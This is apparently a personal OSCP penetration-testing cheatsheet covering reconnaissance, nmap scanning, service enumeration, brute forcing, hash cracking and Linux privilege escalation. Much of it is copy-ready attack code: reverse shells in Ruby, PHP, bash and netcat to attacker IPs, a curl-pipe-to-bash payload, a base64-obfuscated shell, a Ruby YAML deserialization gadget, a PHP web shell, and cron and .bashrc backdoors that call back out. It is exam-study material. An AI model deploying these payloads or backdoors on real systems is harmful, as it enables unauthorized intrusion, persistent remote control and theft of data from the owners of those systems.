# OSCP-Cheatsheet
The essential tools and procedure Kaoryu for OSCP  
You can find important upload on top of page

## Global RoadMap for Pentest _For Linux_
### 1. Passive recognition
 - Command helpful for passive recognition 
```bash
sudo grep [[:upper:]] /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep [[:lower:]] | grep [[:digit:]] | grep '^[[:alnum:][:space:]]*$' |grep -wE '\b\w{12}\b' > test.txt
ffuf -w nb.txt -u http://94.237.51.60:37006/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "otp=FUZZ" -fr "Invalid OTP."
whois <sitename.example>
# query the DB whois to list the informations of a domain name
nslookup -type=A <sitename.example> <IP address>
# list the IPv4 link at this domain name
nslookup -type=MX nomdedomaine.exemple <IP address>
# list the mail server at this domain name
```
 - 2 sites more helpful and wider than command  
   [DNSdumper.com](DNSdumper.com) and [Shodan.io](Shodan.io)
### 2. System enumeration
#### 2.1 Scan Port
 - **Nmap** and these most useful parameters
```bash
nmap -sS <IP address>
#nmap with the flag SYN
nmap -sL <IP address>-255
#allow to test a range of IP address
nmap -sL <IP address>/29
#allow to scan all IP address of a subnet here subnet 29
sudo nmap -PR -sn <IP address>
#-PR only scan with ARP request and don't scan the ports with -sn
sudo nmap -S SPOOFED_IP <IP address>
#scan with spoofed address
nmap -D DECOY_IP,ME <IP address>
#scan with decoy adress
sudo nmap -sI ZOMBIE_IP <IP address>
#scan from zombie address (ex: old printer)
nmap --reason <IP address>
#explains his reason of why this port or this port is open
nmap -sV --version-all <IP address>
#Connexion 3-way handshake to know the version of services
sudo nmap -sS -O <IP address>
#detection of l'OS
sudo nmap -sS --traceroute <IP address>
#like traceroute but with nmap
sudo nmap -sS --script=<default> <IP address>
#allow to use a script by default stored here: /usr/share/nmap/scripts
sudo nmap -sS -oG <foldername> <IP address>
#transfer the result to new folder grepable 
# -p- scan all ports, -f ou -ff (divide the packets for firewalls)
sudo nmap -sN -oG NOM_DU_FICHIER <IP address>
#use -sN for the null Flag and don't be detect by IPS
```
#### 2.2 HTTP/S enumeration
I have other cheatcheat only for web exploit  
**Php server**
Some common and important location in php server
```
db.php
config.php
index.php
login.php
admin.php
ressources/*.js
```

**steganography**
```bash
binwalk <image.jpg>
#allow to see if a other folder is hide in image / does not work every time
binwalk -e <image.jpg> 
#extract hidden data
stegide extract -sf <image.jpg> -p <passphrase>
#allow to extract data lock with password
stegseek <image.jpg> /usr/share/wordlists/rockyou.txt
#brute force the password of date 
```
- Common http directory `/robots.txt`,`sitemap.xml`,`/images`,`/admin`,`/bin`,`/cgi-bin`,`/stats`,`/icons`,`/doc`,`/docs`
- We can automatize enumeration 
```bash
gobuster dir -u http://<IP address> -w /usr/share/worldist.txt -x txt,xml,js,css,html,php
ffuf -u http://<IP address>/FUZZ -w /usr/share/worldist.txt -p "0.1" -H "Name:Value" (-H = Header)
#scan wide hidden directory 
nikto -h http://<IP address>
#in addition to gobuster or ffuf scan
```
#### 2.3 SMB enumeration
- port 445 by default
```bash
#enum4linux -a http://<IP address>
enumeration of SMB server
```
#### 2.4 SSH enumeration
- port 22 by default
```bash
telnet <IP address> 22
#use telnet (TCP/IP text) to communicate with ssh
ssh <name>@<IP address>
ssh -i ~/Path/to/id_rsa <name>@<IP address>
#if you need to connect with key rsa
```
**Port Forwarding**  
ex: You can use port forwarding to analyze localhost wab applications. 
```bash
#attacker machine
ssh -L <PORTUWANT>:127.0.0.1:<PORTWEBAPP> example@10.10.85.66
ssh -L 4444:127.0.0.1:80 web1@10.10.85.66
```
Now you can analyze port forwarding in chrome://inspect > Discover network targets > 127.0.0.1:80
![](Capture_d'écran_2025-02-07_081613.png)

#### 2.5 FTP enumeration
- port 21 by default
- if FTP is on anonymous mode user=anonymous pass=whateveryouwant
```bash
telnet <IP address> 21
#use telnet (TCP/IP text) to communicate with FTP, tap ctrl+alt+] and quit to extract
ftp <IP address> <port>
USER or PASS to connect
you can use ls and get FILENAME
```
Sometimes ftp require a ssl connexion use lftp
```
lftp ftp://user:password@hostname
#if you have a problem with certificate
set ssl:verify-certificate false 
```
### 3. Exploit
#### 3.2 Reverse shell
reverse shell linux [hacktricks.xyz/reverse-shells/linux](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux)  
  
**Ruby Revershell**
```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.14.32","9999");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
ruby -rsocket -e 'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.32","9999"))'
```

**PHP revershell**  
```php
<?php exec("/bin/bash -c 'bash -i > /dev/tcp/ATTACKING-IP/1234 0>&1'");
```
**bash and netcat revershell**
```bash
#victim
/bin/bash -i >& /dev/tcp/0.0.0.0/1234 0>&1
/bin/sh -i >& /dev/tcp/0.0.0.0/1234 0>&1
echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzAuMC4wLjAvMTIzNCAwPiYx' | base64 -d | bash
#you
nc -lvnp 1234
```

```bash
nc -e /bin/bash 0.0.0.0 1234
nc -c /bin/bash 0.0.0.0 1234
```
**with curl revershell**  
create shell.sh  
```bash
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.49/4444 0>&1' > shell.sh
nc -lvnp 4444
```
your payload now   
```
curl http://10.10.14.49:4444/shell.sh | bash
```
**When you have a shell**  
run pseudo temrinal with /bin/bash instance, determine type of terminal in use and foreground last processes in running  
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo;
```
#### 3.3 Password bruteforce  
before bruteforce prefer to find a valid username because combination of bruteforce username and password is very very long  
Hydra vs Medusa: hydra is more complexe but she have more flexibilities

**Hydra services :**  
| Service/Protocol                    | Example Command                                                                                               |
|-------------------------------------|---------------------------------------------------------------------------------------------------------------|
| File Transfer Protocol (FTP)        | hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100                                              | 
| Secure Shell (SSH)                  | hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100                                               |
| HTTP Web Services                   | hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"  |
| Simple Mail Transfer Protocol (SMTP)| hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com                                           |
| Post Office Protocol (POP3)         | hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com                                |
| Internet Message Access Protocol    | hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com                                |
| MySQL Database                      | hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100                                             |
| Microsoft SQL Server                | hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100                                               |
| Virtual Network Computing (VNC)     | hydra -P /path/to/password_list.txt vnc://192.168.1.100                                                       |
| Remote Desktop Protocol (RDP)       | hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100                                              |

SSH multiple target
```bash
hydra -l root -p toor -M targets.txt -s 6000 ssh #target.txt= list of all user IP ssh, -s change port
```

**Medusa services :**  
| Service/Protocol                    | Example Command                                                                                                            |
|-------------------------------------|----------------------------------------------------------------------------------------------------------------------------|
| File Transfer Protocol (FTP)        | medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt                                                                   | 
| Secure Shell (SSH)                  | medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt                                                                    |
| HTTP Web Services                   | medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^  |
| TELNET                              | medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt                                                                |
| Post Office Protocol (POP3)         | medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt                                                           |
| Internet Message Access Protocol    | medusa -M imap -h mail.example.com -U users.txt -P passwords.txt                                                           |
| MySQL Database                      | medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt                                                                  |
| Version Control System              | medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt                                                                   |
| Virtual Network Computing (VNC)     | medusa -M vnc -h 192.168.1.100 -P passwords.txt                                                                            |
| Remote Desktop Protocol (RDP)       | medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt                                                                   |


You can generate custom list of username and custom list of password with `cupp` and `username-anarchy`  
```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
./username-anarchy Jane Smith > jane_smith_usernames.txt

#for password
sudo apt install cupp -y
cupp -i
```
#### 3.4 Hashcracking
- Popular type of hash :
```test
MD5: 32-character hexadecimal hash, often used for file integrity and password storage.
SHA-1: 40-character hexadecimal hash, commonly used for digital signatures and password storage.
SHA-256: 64-character hexadecimal hash, widely used for cryptographic purposes, including password storage and digital signatures.
bcrypt: Variable-length hash, typically 22-34 characters long, with a salt value and a work factor (iterations).
PBKDF2: Variable-length hash, typically 32-64 characters long, with a salt value and a work factor (iterations).
Argon2: Variable-length hash, typically 32-64 characters long, with a salt value and a work factor (iterations).
```
- hascat
`-m 0` is for tell to hashcat is MD5 and  `-m 3200` is bcrypt
```
hascat hash.txt -m 3200 rockyou.txt
```
### 4. escalation privilege LINUX
#### **Basic enumaration**
You need to search about kernel version, user and group, services, logs, host directory,.... 
look to the important location file in documents of this page
```bash
uname -a
#give name of host and kernel
id
#name and group user
sudo -l
#allow look if user have permission to use sudo
getcap -r / 2>/dev/null
#list user capabilities
find / -type f -perm -04000 -ls 2>/dev/null
#list folder with SUID or GUID
cat /etc/crontab
#list user crontrab (they can be modifed for be execute by root)
```
if there are SUID ou GUID look [gtfobins.io](https://gtfobins.github.io/)  


**GIT:**  
You can cherche for a file .git and see commit.  
```bash
# main command to interact with .git file
git status
git log
git show <id_commit>
```


**Application running on localhost:**  
```
ss -tulpn
netstat -tulp
ps aux
```


**Auto enum:**  
can automatize enumeration system with [linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) or [LinEnum.sh](https://github.com/rebootuser/LinEnum)  
PSPY64 is a good enumeration system, he permite to check in real time the running processes.    


**Keepass:**  
Password manager (.kdb,.kdbx):  
```bash
kpcli --kdb Database.kdb
kpcli> find .
kpcli> show Path/example/ssh -f
kpcli> attach Path/example/ssh
```
brut force password  
```bash
keepass2john Database.kdb
```
#### **Ruby esca**  
**YAML.load(file.yml)**  
modify file.yml =  
```ruby
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "bash -c 'bash -i >& /dev/tcp/10.10.14.32/8888 0>&1'"
         method_id: :resolve
```

#### **Python esca**
- If user have permission use sudo on python script, you can check if the script have an import, argument,...  
```python
#file name example.py
import requests

requests.get("http://localhost/test")

#file name requests.py

def get(a):
   print("you get hacked")
```
Make sure that the requests.py file is in the same directory as your script, or is available in the Python path, so that Python can find it.  
**eval()**
If script python have an eval() and variable isnt sanitarize we can inject malicious commande like this:  
```python
a = "__import__('os').system('/bin/bash -i')"
eval(a)
```
```bash
export PYTHONPATH=$PYTHONPATH:/path/to/your/module/directory
```
#### **transfer script**
- for tansfer script or folder with server/attacker machine :
```bash
# Local network
python3 -m http.server <port> #file owner
wget http://<IP address>:<port>/file.txt #download file

#Don't forget to give permission to execute script
chmod +x file.sh
chmod +s file.sh #transfer suid of who execute this chmod cmmd
``` 
#### Backdoor
- SSH backdoor this consiste at generate ssh keygen and put our public key in /home/user/.shh of your target
- isn't secret
```bash
#go in /home/attacker/.shh and generate private and public key
ssh-keygen -t rsa -b 4096
chmod 600 id_rsa
#now transfer id_rsa.pub via netcat or whatever you want in home/target/.ssh and rename file in authorized_key
nc <target ip> -lvnp <port> < id_rsa.pub #host
nc <attacker ip> <port> < authorized_key #target
```
- Php backdoor copy this in some file in /var/www/html and change cmd because its a common request 
```php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```
- Crontab backdoor
```bash
sudo crontab -e #sudo if you can, it's for add rule in crontab
* * * * * bash -i >& /dev/tcp/<IP>/<port 0>&1 #execute every min this command
nc -lvnp <port> #on your machine who want connect
```
- ~/.bashrc backdoor
```bash
#.bashrc, exe file launch when a termil bash it started
cat /etc/passwd #verif if user use /bin/bash
chsh -l <username> #modif default shell
echo 'bash -i >& /dev/tcp/<IP>/<port> >&1' >> ~/.bashrc #payload backdoor
nc -lvnp <port> #on your machine who want connect
```
### 5. escalation privilege WINDOWS
